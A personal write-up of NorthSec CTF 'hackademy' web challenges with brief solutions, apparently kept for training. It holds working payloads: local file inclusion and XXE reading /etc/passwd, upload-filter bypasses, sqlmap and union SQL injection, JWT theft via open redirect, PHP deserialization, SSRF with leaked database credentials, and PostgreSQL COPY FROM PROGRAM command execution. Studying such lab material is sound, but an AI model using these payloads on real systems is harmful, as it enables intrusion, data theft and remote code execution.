## hackademy-writeup ☠

Every year, in the NorthSec CTF, when I come face to face with the hackademy track, I just forget the basics.
This writeup is intended for my personal use in this same track next year (feel free to use this tho)

### Automatization 101
Check source code

### Automatization 102
Look at the robots.txt file

### Inclusion 101
Change the ```?page=welcome.php``` to ```/etc/passwd```

### Inclusion 102
This is an XXE, check the source code, then catch the request in burp, modify the body in the repeater for something like this:<br>
```<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY ext SYSTEM "file:///etc/passwd" >]><function><getConversation>&ext;</getConversation></function>```

(thanks lolkatz)

### Inclusion 103
PHP convert to Base64... add ```php://filter/convert.base64-encode/resource=index.php``` after the ```?page=```<br>
Decode the string

### Upload 101
Create a basic PHP script like ```<?php echo 'Hello World'; ?>``` and name it script.jpg.php (security only checks the first .xxx)

### Upload 102
Upload the script created in Upload 101 and catch the request in Burp Repeater and change the ```Content-type``` to ```image/jpeg```

### Upload 103
This step checks the file signature, force the PNG file signature ```89 50 4E 47 0D 0A 1A 0A``` in the first bytes of the script created earlier

### Upload 104
Same as upload 101 but change the name of the script to script.png.php3

### SQL 101
Kinda hard for a 101 track, but use sqlmap with this command:```sqlmap u "URL HERE" --data "password=admin&username=admin" -p "password,username" --method POST --current-db --dump --technique=BEUSTQ```

### SQL 102
Directly in the username field, enter the injection: ```' union SELECT '','',''--```

### Open Redirect 101
My team owns a small server on the CTF network, so we redirect the user there ```URL.ctf/?sub_url=http://shell.ctf```<br>
Look at the logs on the server, we can see his JWT token.<br>
Go to ```URL.ctf/?identity=(insert JWT)``` (reminder; the token is only valid for 20mins)

### Serialize 101
Look at the source code and change the WelcomeMessage function by the function that outputs the base64 string, GiveMeFlagPrettyPlease()<br>
This is the final payload:
```
<?php
    class Hackademy{
        private $call = "GiveMeFlagPrettyPlease";
    }   
    $serialized = serialize(new Hackademy());

    echo $serialized;
?>
```
I then take the output in a base64 encoder tool and use this encoded output in the URL parameter, and it gives me the flag :)

### Forgery 101
In the url input: ```file:///var/www/html/api/config.php```<br>
We got the first flag, but also some credentials for Forgery 102

### Forgery 102
URL: ```http://localhost:8080```<br>
Method: ```POST```<br>
Params: ```user=postgres&password=Let%26me%3Din&query=SELECT * FROM pg_tables```<br>
Then modify the params for ```user=postgres&password=Let%26me%3Din&query=SELECT * from flag.flag_numbersFoundWithPreviousCommand```

### Forgery 103
Different commands to try in the params:
```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'ls /';
SELECT * FROM cmd_exec;
COPY cmd_exec FROM PROGRAM 'cat /flag_is_in_here_numbersFoundWithPreviousCommand.txt';
SELECT * FROM cmd_exec;
```
